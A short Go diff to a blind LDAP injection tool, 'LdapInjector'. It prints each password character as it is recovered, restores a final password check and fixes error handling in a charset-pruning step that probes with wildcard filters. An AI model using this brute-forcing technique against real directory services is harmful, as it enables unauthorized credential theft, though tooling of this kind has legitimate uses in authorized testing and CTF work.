@@ -54,6 +54,7 @@ func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
 		if ok, err := li.TestPassword(fmt.Sprintf("%s%s", prefix, string(c))); err != nil {
 			return "", err
 		} else if ok {
+			fmt.Print(string(c))
 			return string(c), nil
 		}
 	}
@@ -69,13 +70,11 @@ func (li *LdapInjector) Brute() (string, error) {
 			return "", err
 		}
 		if c == "" {
-			/*
 			if ok, err := li.TestPassword(result); err != nil {
 				return "", err
 			} else if !ok {
 				return "", fmt.Errorf("partial password found: %s", result)
 			}
-			*/
 			break
 		}
 		result += c
@@ -99,7 +98,7 @@ func (li *LdapInjector) PruneCharset() (error) {
 	var newCharset string
 	for _, char := range li.Charset {
 		if ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(char))); err != nil {
-			return nil
+			return err
 		} else if ok {
 			newCharset += string(char)
 		}
